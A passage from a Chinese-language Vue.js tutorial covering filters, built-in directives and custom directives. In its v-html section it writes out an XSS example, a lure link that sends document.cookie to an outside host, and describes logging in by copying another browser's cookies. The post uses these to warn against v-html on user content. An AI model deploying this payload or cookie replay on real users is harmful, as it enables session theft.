如果加了括号传参，如：`&#123;&#123;time | timeFormater('YYYY_MM_DD')&#125;&#125;</code>，表面上传了一个参数，但实际上，传递了两个，第一个参数一定是前面的time！！！而第二个参数才是括号中的内容。</p>
<p>多个过滤器可以实现串联，过滤是按管道书写顺序来的。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903205506937.png" srcset="/img/loading.gif" lazyload alt="image-20210903205506937" style="zoom:80%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903205754696.png" srcset="/img/loading.gif" lazyload alt="image-20210903205754696"></p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903205846589.png" srcset="/img/loading.gif" lazyload alt="局部过滤器"></p>
<p>局部过滤器：只有当前Vue实例能够使用，如果再出现一个Vue实例，就不能够使用了，即：如果vmA创建过滤器demoA，vmB创建过滤器demoB，则只能vmA用demoA，vmB用demoB。（以后一个vm，多个组件）</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903210533310.png" srcset="/img/loading.gif" lazyload alt="image-20210903210533310" style="zoom:80%;" />

<ul>
<li><p>注意：</p>
<ul>
<li><p>过滤器不但能用在插值语法中，还能用于数据绑定时的过滤：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903210958479.png" srcset="/img/loading.gif" lazyload alt="image-20210903210958479" style="zoom:80%;" />

<p>但是只能用于v-bind，不能用于v-model</p>
</li>
</ul>
</li>
</ul>
<h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml">  <span class="hljs-comment">&lt;!--引入VUE--&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/dayjs.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml">  <span class="hljs-comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>显示格式化后的时间<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml">    <span class="hljs-comment">&lt;!-- 计算属性实现 --&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>现在是：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">fmtTime</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br><span class="xml">    <span class="hljs-comment">&lt;!-- methods实现 --&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">getFmtTime</span>()&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br><span class="xml">    <span class="hljs-comment">&lt;!-- 过滤器实现 --&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">:x</span>=<span class="hljs-string">&quot;name | myslice&quot;</span>&gt;</span>现在是：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">time</span> | timeFormater | myslice&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">  Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。</span><br><span class="xml">  // 配置全局过滤器</span><br><span class="xml">  Vue.filter(&#x27;myslice&#x27;,function(value)&#123;</span><br><span class="xml">    return value.slice(0,4);</span><br><span class="xml">  &#125;)</span><br><span class="xml">  new Vue(&#123;</span><br><span class="xml">    el: &#x27;#root&#x27;,</span><br><span class="xml">    data: &#123;</span><br><span class="xml">      time: 1630671767228, //时间戳</span><br><span class="xml">      name:&#x27;张加林&amp;&amp;&amp;zl&#x27;,</span><br><span class="xml">    &#125;,</span><br><span class="xml">    computed: &#123;</span><br><span class="xml">      fmtTime() &#123;</span><br><span class="xml">        return dayjs(this.time).format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;); //给参数格式化参数时间，不给参数默认格式化当前时间</span><br><span class="xml">      &#125;</span><br><span class="xml">    &#125;,</span><br><span class="xml">    methods:&#123;</span><br><span class="xml">      getFmtTime()&#123;</span><br><span class="xml">        return dayjs(this.time).format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;); </span><br><span class="xml">      &#125;</span><br><span class="xml">    &#125;,</span><br><span class="xml">    filters:&#123;</span><br><span class="xml">      // 局部过滤器</span><br><span class="xml">      timeFormater(value,str = &#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#123; // ES6形参默认值</span><br><span class="xml">        return dayjs(value).format(str); </span><br><span class="xml">      &#125;,</span><br><span class="xml">      // myslice(value)&#123;</span><br><span class="xml">      //   return value.splice(0,4);</span><br><span class="xml">      // &#125;</span><br><span class="xml">    &#125;</span><br><span class="xml">  &#125;)</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><ul>
<li>过滤器：<ul>
<li>语法：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑处理）</li>
<li>语法：<ul>
<li>注册过滤器：<code>Vue.filter(name,callback)</code> 或 <code>new Vue(filters:&#123;&#125;)</code></li>
<li>使用过滤器：<code>&#123;&#123;xxx | 过滤器名&#125;&#125;</code>或·<code>v-bind:属性 = &quot;xxx | 过滤器名&quot;</code></li>
</ul>
</li>
<li>备注：<ul>
<li>过滤器也可以接收额外的参数，多个过滤器可以串联</li>
<li>并没有改变原来的数据，是产生新的对应的数据</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-26-Vue内置指令"><a href="#1-26-Vue内置指令" class="headerlink" title="1.26 Vue内置指令"></a>1.26 Vue内置指令</h3><h4 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h4><p>作用：向其所在节点中渲染文本内容。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903212241658.png" srcset="/img/loading.gif" lazyload alt="image-20210903212241658" style="zoom:80%;" />

<ul>
<li>与插值语法的区别：<ul>
<li>v-text会拿到v-text中的变量值，然后替换整个节点中的值，而插值语法不会。<ul>
<li>更加常用的是插值语法，因为它灵活。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>v-text不能解析标签，而是将所有字符当做正常文本解析，不会当作标签结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;h2 v-text &#x3D; &quot;test&quot;&gt;&lt;&#x2F;h2&gt;<br>……………………<br>data:&#123;<br>    site:&#39;miketaylorjuly123.cn&#39;,<br>    test: &#39;&lt;h3&gt;张加林&lt;&#x2F;h3&gt;&#39;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903212648288.png" srcset="/img/loading.gif" lazyload alt="image-20210903212648288"></p>
<h4 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h4><p>v-html支持结构解析，而v-text不支持。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903213238411.png" srcset="/img/loading.gif" lazyload alt="image-20210903213238411" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903213255837.png" srcset="/img/loading.gif" lazyload alt="image-20210903213255837" style="zoom:67%;" />

<h5 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h5><p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903213901568.png" srcset="/img/loading.gif" lazyload alt="image-20210903213901568"></p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903214006260.png" srcset="/img/loading.gif" lazyload alt="image-20210903214006260"></p>
<p>登录网易邮箱为例：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903214247209.png" srcset="/img/loading.gif" lazyload alt="image-20210903214247209" style="zoom:80%;" />

<p>换一个浏览器，将Cookie要登录的页面的cookie全部删除，替换为已经登录的浏览器的Cookie中的key value，你就可以成功登录页面！</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903215003432.png" srcset="/img/loading.gif" lazyload alt="image-20210903215003432" style="zoom:80%;" />

<p>使用上述插件可以一键导入导出cookie。</p>
<h5 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h5><p>js获取cookie</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903215329532.png" srcset="/img/loading.gif" lazyload alt="image-20210903215329532"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>      &lt;h2&gt;&#123;&#123;site&#125;&#125;&lt;&#x2F;h2&gt;<br>      &lt;h2 v-text &#x3D; &quot;test&quot;&gt;&lt;&#x2F;h2&gt;<br>      &lt;h2 v-html &#x3D; &quot;test&quot;&gt;&lt;&#x2F;h2&gt;<br>      &lt;div v-html&#x3D;&quot;str&quot;&gt;&lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>  &lt;script&gt;<br>    Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el:&#39;#root&#39;,<br>        data:&#123;<br>            site:&#39;miketaylorjuly123.cn&#39;,<br>            test: &#39;&lt;h3&gt;张加林&lt;&#x2F;h3&gt;&#39;,<br>            str:&#39;&lt;a href&#x3D;javascript:location.href &#x3D; &quot;http:&#x2F;&#x2F;www.baidu.com?&quot;+document.cookie&gt;我找的你想康的了，快来康康！！！&lt;&#x2F;a&gt;&#39;<br>        &#125;<br>    &#125;)<br>  &lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210904214531529.png" srcset="/img/loading.gif" lazyload alt="image-20210904214531529"></p>
<p>点击后，获取当前正在所处网站的全部cookie，然后跳走，并且把所有的cookie以参数的形式传给坏人的服务器。</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210904215026698.png" srcset="/img/loading.gif" lazyload alt="image-20210904215026698"></p>
<p>设置HttpOnly，使得cookie的该字段只能由HTTP协议可以读取，可以携带（js代码无法再直接读取cookie），所以敏感数据最好加HttpOnly限制。</p>
<h5 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h5><ul>
<li>v-html<ul>
<li>作用：向指定节点渲染包含html结构的内容</li>
<li>与插值语法的区别：<ul>
<li>v-html会替换掉节点中所有的内容，而不会这样</li>
<li>v-html可以识别html结构</li>
</ul>
</li>
<li>特别要注意：v-html有安全性问题！！！<ul>
<li>在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击（跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞，能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。）</li>
<li>一定要在信任的内容上使用v-html，<strong>永远不要用在用户提交的内容上！！！</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="v-cloak"><a href="#v-cloak" class="headerlink" title="v-cloak"></a>v-cloak</h4><p><code>Win + R</code> =&gt; <code>cmd</code> =&gt; <code>node server</code>启动</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210906103146548.png" srcset="/img/loading.gif" lazyload alt="image-20210906103146548" style="zoom:80%;" />

<p>访问链接：<code>https://localhost:8080/resource/5s/vue.js</code></p>
<p>5s代表5s后返回vue.js给访问方。</p>
<p>虽然下述方式可以调节网速，但是无法控制外部的js返回时间。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210906111035400.png" srcset="/img/loading.gif" lazyload alt="image-20210906111035400" style="zoom: 80%;" />

<p>js阻塞：JS具有阻塞特性，当浏览器在执行js代码时，不能同时做其它事情，即<script>每次出现都会让页面等待脚本的解析和执行（不论JS是内嵌的还是外链的），JS代码执行完成后，才继续渲染页面。</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210906112001423.png" srcset="/img/loading.gif" lazyload alt="image-20210906112001423"></p>
<p>下图效果：页面先显示<code>&#123;&#123;site&#125;&#125;</code>；5s后显示<code>miketaylorhuly123.cn</code>，页面内容较多时，就会出现页面闪现抖动。</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210906112216012.png" srcset="/img/loading.gif" lazyload alt="image-20210906112216012"></p>
<p>解决该问题的方法：v-cloak</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;head&gt;<br>    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;<br>    &lt;title&gt;&lt;&#x2F;title&gt;<br>    &lt;!--引入VUE--&gt;<br>    &lt;style&gt;<br>      [v-cloak]&#123;<br>        &#x2F;* 选中所有标签中，有v-cloak属性的元素 *&#x2F;<br>        display: none;<br>      &#125;<br>    &lt;&#x2F;style&gt;<br>  &lt;&#x2F;head&gt;<br>  &lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>      &lt;h2 v-cloak&gt;&#123;&#123;site&#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;&#x2F;div&gt;<br>    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;localhost:8080&#x2F;resource&#x2F;5s&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;<br>  &lt;&#x2F;body&gt;<br>    &lt;script&gt;<br>      console.log(1);<br>      Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>      new Vue(&#123;<br>          el:&#39;#root&#39;,<br>          data:&#123;<br>            site:&#39;miketaylorjuly123.cn&#39;    <br>          &#125;<br>      &#125;)<br>    &lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>并结：<ul>
<li>v-cloak指令（没有值）：<ul>
<li>本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删除v-cloak属性</li>
<li>使用css配合v-cloak可以解决网速慢时页面展示出<code>&#123;&#123;xxx&#125;&#125;</code>的问题</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="v-once"><a href="#v-once" class="headerlink" title="v-once"></a>v-once</h4><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/39.gif" srcset="/img/loading.gif" lazyload alt="39" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>      &lt;h2 v-once&gt;初始化n值：&#123;&#123;n&#125;&#125;&lt;&#x2F;h2&gt;<br>      &lt;h2&gt;当前n值是：&#123;&#123;n&#125;&#125;&lt;&#x2F;h2&gt;<br>      &lt;button @click&#x3D;&quot;n++&quot;&gt;点击n++&lt;&#x2F;button&gt;<br>    &lt;&#x2F;div&gt;<br>  &lt;&#x2F;body&gt;<br>    &lt;script&gt;<br>      Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>      new Vue(&#123;<br>          el:&#39;#root&#39;,<br>          data:&#123;<br>              n:1,<br>          &#125;<br>      &#125;)<br>    &lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>总结：<ul>
<li>v-once指令：<ul>
<li>v-once所在节点在<strong>初次动态渲染</strong>后，就视为静态内容了。</li>
<li>以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。</li>
</ul>
</li>
<li>注意区分v-once和once事件修饰符</li>
</ul>
</li>
</ul>
<h4 id="v-pre"><a href="#v-pre" class="headerlink" title="v-pre"></a>v-pre</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>      &lt;h2 v-pre&gt;Vue其实很简单&lt;&#x2F;h2&gt;<br>      &lt;h2 v-pre&gt;当前n值是：&#123;&#123;n&#125;&#125;&lt;&#x2F;h2&gt;<br>      &lt;button @click&#x3D;&quot;n++&quot; v-pre&gt;点击n++&lt;&#x2F;button&gt;<br>    &lt;&#x2F;div&gt;<br>  &lt;&#x2F;body&gt;<br>    &lt;script&gt;<br>      Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>      new Vue(&#123;<br>          el:&#39;#root&#39;,<br>          data:&#123;<br>              n:1,<br>          &#125;<br>      &#125;)<br>    &lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>总结：<ul>
<li>v-pre指令：<ul>
<li>跳过其所在节点的编译过程</li>
<li>可以利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-27-Vue自定义指令"><a href="#1-27-Vue自定义指令" class="headerlink" title="1.27 Vue自定义指令"></a>1.27 Vue自定义指令</h3><h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>自定义指令需要自己操作DOM编写指令</p>
<ul>
<li>需求一：定义一个<code>v-big</code>指令，和<code>v-text</code>功能类似，但会把绑定的数值放大10倍（函数式实现）</li>
<li>需求二：定义一个<code>v-bind</code>指令，和<code>v-bind</code>功能类似，但是可以让其所绑定的<code>input</code>元素默认获取焦点（只能对象式实现，函数式实现不了）</li>
</ul>
<h4 id="函数式"><a href="#函数式" class="headerlink" title="函数式"></a>函数式</h4><p>缺点是不能处理一些细节上的问题。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210912172048399.png" srcset="/img/loading.gif" lazyload alt="image-20210912172048399" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210912171958023.png" srcset="/img/loading.gif" lazyload alt="image-20210912171958023" style="zoom:80%;" />

<p>注意：b的value是值；这里的<code>span</code>标签是真实的DOM元素；定义时<code>name</code>，使用时<code>v-big</code></p>
<p>证明：</p>
<ul>
<li>方法一：</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">console</span>.dir(a);<br></code></pre></td></tr></table></figure>



<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210912172916986.png" srcset="/img/loading.gif" lazyload alt="image-20210912172916986" style="zoom:80%;" />

<ul>
<li><p>方法二：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">console</span>.log(a <span class="hljs-keyword">instanceof</span> HTMLElement); <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure>

<p><code>instanceof</code>用于判断<code>a</code>是不是HTML元素实例。</p>
</li>
</ul>
<h5 id="实现需求一"><a href="#实现需求一" class="headerlink" title="实现需求一"></a>实现需求一</h5><p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/40.gif" srcset="/img/loading.gif" lazyload alt="40"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>当前的n值是：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>放大10倍后的值是：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-big</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;n++&quot;</span>&gt;</span>点我n++<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">    Vue.config.productionTip = <span class="hljs-literal">false</span>;<span class="hljs-comment">// 阻止VUE启动时生成生产提示。</span></span><br><span class="javascript">    <span class="hljs-keyword">new</span> Vue(&#123;</span><br><span class="javascript">        el: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br>        data: &#123;<br>            n: 1,<br>        &#125;,<br>        directives: &#123;<br><span class="javascript">            <span class="hljs-comment">// big:function()&#123;</span></span><br><span class="javascript">            <span class="hljs-function"><span class="hljs-title">big</span>(<span class="hljs-params">element,binding</span>)</span> &#123;</span><br>                element.innerHTML = binding.value * 10;<br>            &#125;<br>        &#125;<br>    &#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>big函数何时会被调用？<ul>
<li>指令与元素成功绑定的时候（一上来）</li>
<li>指令所在的模板被重新解析时（这里是n发生了变化，导致重新解析模板<strong>一定不是指令用到的数据发生更新时！！！</strong>）<ul>
<li><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/41.gif" srcset="/img/loading.gif" lazyload alt="41"></li>
<li>data数据发生变化时，重新解析一次，然后再解析的时候解析了v-big</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="对象式"><a href="#对象式" class="headerlink" title="对象式"></a>对象式</h4><h5 id="错误分析"><a href="#错误分析" class="headerlink" title="错误分析"></a>错误分析</h5><ul>
<li><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210913233651845.png" srcset="/img/loading.gif" lazyload alt="image-20210913233651845" style="zoom:80%;" />

<p>这里不要取巧使用<code>autofocus</code>，因为它不是在所有的浏览器中都适用。</p>
</li>
<li><p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210913235143083.png" srcset="/img/loading.gif" lazyload alt="image-20210913235143083" style="zoom:80%;" /><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/43.gif" srcset="/img/loading.gif" lazyload alt="43" style="zoom:80%;" /></p>
<p>效果：开始没有获取焦点，点击后获取焦点。</p>
<ul>
<li><pre><code class="html">&lt;body&gt;
    &lt;button id =&quot;btn&quot;&gt;点我创建一个输入框&lt;/button&gt;
    &lt;script type=&quot;text/javascript&quot;&gt;
        const btn = document.getElementById(&quot;btn&quot;)
        btn.onclick = ()=&gt;&#123;
            const input = document.createElement(&#39;input&#39;)
            document.body.appendChild(input)
            input.focus()
        &#125;
    &lt;/script&gt;
